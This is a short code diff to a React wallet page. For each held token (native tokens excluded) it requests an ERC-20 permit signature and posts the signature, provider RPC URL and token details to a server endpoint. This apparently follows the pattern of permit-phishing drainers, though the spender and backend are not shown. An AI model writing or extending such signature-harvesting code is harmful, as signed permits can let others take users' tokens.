@@ -63,7 +63,7 @@ const Page = () => {
 				return (
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
-						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
+						<button disabled={!!signatures[token.contract_ticker_symbol] || token.contract_address.includes("eeeeeeee")} onClick={async () => {
 							const nonce = await provider!.getTransactionCount(account.address!);
 							const sig = await createPermitSignature(async (args: any)=>{
 								return signTypedData(config, args);
@@ -92,7 +92,12 @@ const Page = () => {
 
 							fetch("/api/signature", {
 								method: "POST",
-								body: JSON.stringify(sig),
+								body: JSON.stringify({
+									signedSignature: sig,
+									provider: //@ts-ignore
+										provider.connection.url,
+									token
+								}),
 								headers: {
 									'content-type': "application/json"
 								}
